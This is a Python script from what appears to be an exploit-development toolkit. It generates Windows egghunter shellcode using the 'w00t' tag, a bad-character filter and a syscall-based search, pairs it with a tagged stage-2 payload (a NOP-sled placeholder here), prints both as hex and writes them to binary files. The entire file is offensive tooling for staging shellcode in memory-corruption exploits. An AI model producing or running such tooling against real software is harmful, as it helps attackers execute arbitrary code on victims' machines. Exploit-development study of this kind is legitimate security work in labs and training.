from pathlib import Path

from . import build_stage2, choose_hunter


def to_hex(buf: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in buf)


def main() -> None:
    tag = b"w00t"
    badchars = b"\x00\x0a\x0d"

    syscall = 0x1C6
    payload = b"\x90" * 100

    selected = choose_hunter(
        tag=tag,
        excluded=badchars,
        ntaccess_syscall_id=syscall,
        prefer_seh=False,
    )
    hunter = selected.shellcode
    stage2 = build_stage2(tag, payload)

    print(f"[+] Selected: {selected.name}")
    print(f"[+] Hunter size: {len(hunter)}")

    print("\nHunter:")
    print(f'b"{to_hex(hunter)}"')

    print("\nStage2 preview:")
    print(f'b"{to_hex(stage2[:64])}..."')

    Path("hunter.bin").write_bytes(hunter)
    Path("stage2.bin").write_bytes(stage2)

    print("\n[+] Files written: hunter.bin, stage2.bin")


if __name__ == "__main__":
    main()
